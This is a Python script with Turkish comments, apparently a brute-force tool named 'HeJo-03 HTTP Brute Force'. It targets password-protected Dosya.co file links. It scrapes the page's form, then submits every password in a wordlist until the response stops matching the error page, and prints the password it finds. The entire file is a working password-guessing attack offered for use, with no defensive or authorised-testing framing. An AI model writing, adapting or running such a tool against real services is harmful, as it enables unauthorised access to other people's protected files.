import argparse
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import os

# Colorama'yı başlat
init(autoreset=True)

def main():
    # Argparse ile komut satırı argümanlarını tanımlama
    parser = argparse.ArgumentParser(description="Dosya.co Brute Force Aracı")
    parser.add_argument("-u", "--url", type=str, required=True, help="Hedef Dosya.co URL'si")
    parser.add_argument("-w", "--wordlist", type=str, required=True, help="Wordlist dosyası (\".txt\" formatında)")
    parser.add_argument("-i", "--input-id", type=str, required=True, help="HTML input elementinin ID'si")
    args = parser.parse_args()

    # URL, Wordlist ve Input ID
    url = args.url
    wordlist_path = args.wordlist
    input_id = args.input_id
    os.system('cls' if os.name=='nt' else 'clear')
    # Başlık
    print(f"""{Fore.RED + Style.BRIGHT}
          _____
         |A .  | _____
         | /.\ ||A ^  | _____
         |(_._)|| / \ ||A _  | _____
         |  |  || \ / || ( ) ||A_ _ |
         |____V||  .  ||(_'_)||( v )|
                |____V||  |  || \ / |
                       |____V||  .  |
                              |____V|
                {Fore.YELLOW}HeJo-03
            {Fore.CYAN}HTTP Brute Force

          
          

          
          
          Lütfen bekleyiniz...
{Style.RESET_ALL}
""")
    
    # Sayfanın HTML'sini al
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Sayfaya erişilemedi: {e}")
        return

    soup = BeautifulSoup(response.text, "html.parser")

    # Form alanlarını ve verilerini bul
    form = soup.find("form")
    if not form:
        print(f"{Fore.RED}Form bulunamadı! Lütfen geçerli bir link girin.")
        return

    action = form.get("action")  # Formun gönderim URL'si
    form_url = action if action.startswith("http") else url + action  # Tam URL'yi oluştur

    # Form input'larını hazırla
    data = {}
    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        if name:
            data[name] = input_tag.get("value", "")  # Varsayılan değeri ekle

    # Wordlist dosyasını oku
    try:
        with open(wordlist_path, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}Wordlist dosyası bulunamadı! Lütfen geçerli bir dosya adı girin.")
        return

    # Şifre denemelerini yap
    for password in passwords:
        password = password.strip()  # Satır sonu karakterlerini temizle
        data[input_id] = password  # Şifreyi form verisine ekle

        # POST isteği gönder
        try:
            post_response = requests.post(form_url, data=data)
            response_text = post_response.text.strip()
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}POST isteği sırasında hata: {e}")
            continue

        # Yanıt kontrolü ve çıktıyı düzenleme
        if response_text.startswith("<!DOCTYPE HTML PUBLIC"):
            print(f"{Fore.YELLOW}Şifre: {Fore.CYAN}{password} {Fore.RED}| Sonuç: Şifre yanlış")
        else:
            print(f"{Fore.GREEN}Şifre: {Fore.CYAN}{password} {Fore.GREEN}| Yanıt: \n\n{response_text[:200]}\n")
            print(f"{Fore.MAGENTA}Doğru şifre bulundu: {password}")
            break  # Doğru şifre bulunduğunda döngüyü durdur

if __name__ == "__main__":
    main()